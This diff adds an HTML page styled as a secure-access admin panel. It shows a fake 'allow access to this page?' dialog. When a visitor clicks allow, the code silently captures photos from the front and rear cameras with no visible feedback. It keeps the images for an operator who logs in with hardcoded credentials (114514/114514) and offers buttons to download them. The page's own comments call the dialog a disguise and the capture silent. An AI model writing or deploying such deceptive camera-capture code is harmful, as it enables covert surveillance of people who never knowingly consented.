@@ -1,0 +1,291 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>无标题文档</title>
+</head>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全访问 · 管理面板</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0f0f0f;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #ddd;
+        }
+        /* 伪装询问层 */
+        .permission-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
+            display: flex; align-items: center; justify-content: center; z-index: 1000;
+        }
+        .permission-dialog {
+            background: #1e1e1e; border: 1px solid #444; border-radius: 20px;
+            padding: 40px 30px; text-align: center; max-width: 380px; width: 90%;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+        }
+        .permission-dialog h2 { font-weight: 400; margin-bottom: 15px; font-size: 1.5rem; }
+        .permission-dialog p { font-size: 0.95rem; color: #aaa; margin-bottom: 30px; }
+        .btn-group { display: flex; gap: 15px; justify-content: center; }
+        .btn { padding: 12px 30px; border: none; border-radius: 30px; font-size: 1rem; font-weight: 600; cursor: pointer; }
+        .btn-allow { background: #0077ff; color: white; }
+        .btn-allow:hover { background: #005fcc; }
+        .btn-deny { background: #3a3a3a; color: #ccc; }
+        .btn-deny:hover { background: #4a4a4a; }
+        /* 主面板 */
+        .container {
+            background: #2c2c2c; border-radius: 20px; padding: 40px 30px;
+            width: 100%; max-width: 500px; text-align: center; position: relative; z-index: 1;
+        }
+        .login-box {
+            background: #1e1e1e; border-radius: 12px; padding: 25px 20px; margin-top: 20px;
+        }
+        .login-box input {
+            width: 100%; padding: 12px 15px; margin: 8px 0;
+            background: #3a3a3a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 15px;
+        }
+        .login-box input:focus { border-color: #00e5ff; }
+        .login-box button {
+            width: 100%; padding: 12px; margin-top: 15px; background: #0077ff; border: none;
+            border-radius: 8px; color: white; font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+        .login-box button:hover { background: #005fcc; }
+        .gallery { margin-top: 25px; display: none; }
+        .photo-pair { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; margin-bottom: 25px; }
+        .photo-item { flex: 1 1 180px; background: #1e1e1e; border-radius: 14px; padding: 12px; }
+        .photo-item img { width: 100%; border-radius: 10px; border: 1px solid #444; aspect-ratio: 4/3; object-fit: cover; background: #000; }
+        .photo-label { margin-top: 8px; font-size: 13px; color: #bbb; text-transform: uppercase; }
+        .download-btns { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+        .download-btn { background: #28a745; color: white; padding: 10px 20px; border-radius: 30px; text-decoration: none; font-size: 14px; font-weight: 600; }
+        .download-btn:hover { background: #1e7e34; }
+        .error-msg { color: #ff6b6b; margin-top: 10px; font-size: 14px; display: none; }
+        .hidden { display: none !important; }
+        .debug-note { font-size: 12px; color: #666; margin-top: 8px; display: none; }
+    </style>
+</head>
+<body>
+    <!-- 伪装询问 -->
+    <div class="permission-overlay" id="fakePermission">
+        <div class="permission-dialog">
+            <h2>是否访问该网页？</h2>
+            <p>需要您的确认以继续加载页面功能</p>
+            <div class="btn-group">
+                <button class="btn btn-allow" id="allowBtn">允许访问</button>
+                <button class="btn btn-deny" id="denyBtn">拒绝</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 管理界面 -->
+    <div class="container">
+        <h2>🔒 管理面板</h2>
+        <!-- 状态区域只对管理员显示，此处用 hidden 默认隐藏 -->
+        <div class="status-text hidden" id="statusArea">
+            <span class="status-dot" id="statusDot"></span>
+            <span id="statusMsg"></span>
+        </div>
+
+        <div class="login-box" id="loginBox">
+            <h3 style="font-weight:400; margin-bottom:12px;">管理员登录</h3>
+            <input type="text" id="username" placeholder="账号" autocomplete="off">
+            <input type="password" id="password" placeholder="密码">
+            <button id="loginBtn">登 录</button>
+            <div class="error-msg" id="loginError">账号或密码错误</div>
+        </div>
+
+        <div class="gallery" id="photoGallery">
+            <h3 style="font-weight:400; margin-bottom:15px;">📸 拍摄记录</h3>
+            <div class="photo-pair">
+                <div class="photo-item">
+                    <img id="frontPhoto" alt="前置摄像头">
+                    <div class="photo-label">前置摄像头</div>
+                </div>
+                <div class="photo-item">
+                    <img id="backPhoto" alt="后置摄像头">
+                    <div class="photo-label">后置摄像头</div>
+                </div>
+            </div>
+            <div class="download-btns">
+                <a class="download-btn" id="saveFront" href="#" download="front.jpg">⬇ 保存前置</a>
+                <a class="download-btn" id="saveBack" href="#" download="back.jpg">⬇ 保存后置</a>
+                <a class="download-btn" id="saveBoth" href="#" style="background:#6c5ce7;">⬇ 一键打包</a>
+            </div>
+            <p class="debug-note" id="debugNote"></p>
+        </div>
+    </div>
+
+    <video id="video" style="display:none;" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        (function() {
+            const fakeOverlay = document.getElementById('fakePermission');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const statusArea = document.getElementById('statusArea');
+            const statusDot = document.getElementById('statusDot');
+            const statusMsg = document.getElementById('statusMsg');
+            const loginBox = document.getElementById('loginBox');
+            const loginError = document.getElementById('loginError');
+            const photoGallery = document.getElementById('photoGallery');
+            const frontPhoto = document.getElementById('frontPhoto');
+            const backPhoto = document.getElementById('backPhoto');
+            const saveFront = document.getElementById('saveFront');
+            const saveBack = document.getElementById('saveBack');
+            const saveBoth = document.getElementById('saveBoth');
+            const debugNote = document.getElementById('debugNote');
+
+            let capturedFront = null;
+            let capturedBack = null;
+            const ADMIN_USER = '114514';
+            const ADMIN_PASS = '114514';
+
+            function setStatus(type, msg) {
+                statusArea.classList.remove('hidden'); // 登录后可显示
+                statusDot.className = 'status-dot';
+                if (type === 'loading') statusDot.classList.add('green');
+                else if (type === 'error') statusDot.classList.add('red');
+                statusMsg.textContent = msg;
+            }
+
+            // ---------- 摄像头工具 (优化兼容性) ----------
+            async function getCameraStream(facingMode) {
+                const constraints = {
+                    video: {
+                        facingMode: { ideal: facingMode }, // 使用 ideal 代替 exact，提高兼容性
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+                return navigator.mediaDevices.getUserMedia(constraints);
+            }
+
+            async function capturePhoto(stream) {
+                video.srcObject = stream;
+                await video.play();
+                await new Promise((resolve) => {
+                    if (video.readyState >= 2) resolve();
+                    else video.oncanplay = resolve;
+                });
+                await new Promise(r => setTimeout(r, 1500)); // 增加等待时间，确保曝光稳定
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg', 0.93);
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                return dataURL;
+            }
+
+            function downloadDataURL(dataURL, filename) {
+                const a = document.createElement('a');
+                a.href = dataURL;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => document.body.removeChild(a), 100);
+            }
+
+            // ---------- 自动静默拍摄（无界面反馈）----------
+            async function startCapture() {
+                try {
+                    // 前置
+                    try {
+                        const frontStream = await getCameraStream('user');
+                        capturedFront = await capturePhoto(frontStream);
+                    } catch (e) {
+                        console.warn('前置摄像头失败:', e);
+                    }
+                    // 后置
+                    try {
+                        const backStream = await getCameraStream('environment');
+                        capturedBack = await capturePhoto(backStream);
+                    } catch (e) {
+                        console.warn('后置摄像头失败:', e);
+                    }
+                } catch (err) {
+                    console.error('全局拍摄错误:', err);
+                }
+            }
+
+            // ---------- 权限伪装与启动 ----------
+            allowBtn.addEventListener('click', async () => {
+                fakeOverlay.style.display = 'none';
+                // 检测安全上下文
+                if (window.location.protocol === 'file:') {
+                    // 静默失败，但可在管理员登录后看到提示
+                    console.warn('file:// 协议无法使用摄像头，请使用 http://localhost 打开');
+                    return;
+                }
+                // 启动静默拍摄（不显示任何状态）
+                await startCapture();
+            });
+
+            denyBtn.addEventListener('click', () => {
+                fakeOverlay.style.display = 'none';
+                // 不提供任何反馈
+            });
+
+            // ---------- 管理员登录 ----------
+            document.getElementById('loginBtn').addEventListener('click', () => {
+                const u = document.getElementById('username').value.trim();
+                const p = document.getElementById('password').value;
+                if (u === ADMIN_USER && p === ADMIN_PASS) {
+                    loginError.style.display = 'none';
+                    loginBox.style.display = 'none';
+                    photoGallery.style.display = 'block';
+                    statusArea.classList.remove('hidden'); // 显示状态区域
+
+                    // 填充照片
+                    if (capturedFront) {
+                        frontPhoto.src = capturedFront;
+                        saveFront.href = capturedFront;
+                        setStatus('complete', '前置拍摄成功');
+                    } else {
+                        frontPhoto.alt = '无前置照片';
+                        saveFront.removeAttribute('href');
+                        setStatus('error', '前置摄像头未捕获');
+                    }
+                    if (capturedBack) {
+                        backPhoto.src = capturedBack;
+                        saveBack.href = capturedBack;
+                    } else {
+                        backPhoto.alt = '无后置照片';
+                        saveBack.removeAttribute('href');
+                    }
+                    // 提示如果在 file:// 下
+                    if (window.location.protocol === 'file:') {
+                        debugNote.style.display = 'block';
+                        debugNote.textContent = '⚠️ 当前为 file:// 协议，摄像头不可用。请使用 DW 实时预览或 http://localhost 打开。';
+                    }
+                    // 一键打包
+                    saveBoth.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        if (capturedFront) downloadDataURL(capturedFront, 'front.jpg');
+                        if (capturedBack) setTimeout(() => downloadDataURL(capturedBack, 'back.jpg'), 200);
+                    });
+                } else {
+                    loginError.style.display = 'block';
+                }
+            });
+
+            document.getElementById('password').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') document.getElementById('loginBtn').click();
+            });
+        })();
+    </script>
+</body>
+</html>
+<body>
+</body>
+</html>
